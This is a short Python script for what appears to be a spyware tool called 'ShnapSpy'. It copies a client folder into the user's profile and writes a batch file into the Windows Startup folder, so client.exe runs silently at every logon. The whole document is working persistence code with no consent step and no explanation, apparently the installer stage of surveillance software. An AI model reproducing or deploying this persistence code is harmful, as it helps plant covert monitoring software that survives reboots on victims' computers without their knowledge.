import getpass
import shutil
import sys
import os

USER_NAME = getpass.getuser()


def add_to_startup(file_path):
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "ShnapSpy.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)


def move_dir():
    new_path = r'C:\Users\%s' % USER_NAME
    main_dir = os.path.join(new_path, "ShnapSpy")
    exists = os.path.isdir(main_dir)
    if not exists:
        print("doesnt")
        dest = shutil.copytree(os.path.join(os.path.dirname(os.path.realpath(sys.executable)), 'ShnapSpy Client'), main_dir)
    else:
        print("does")
        shutil.rmtree(main_dir, ignore_errors=True)
        dest = shutil.copytree(os.path.join(os.path.dirname(os.path.realpath(sys.executable)), 'ShnapSpy Client'), main_dir)
    return os.path.join(dest, "client.exe")


add_to_startup(move_dir())

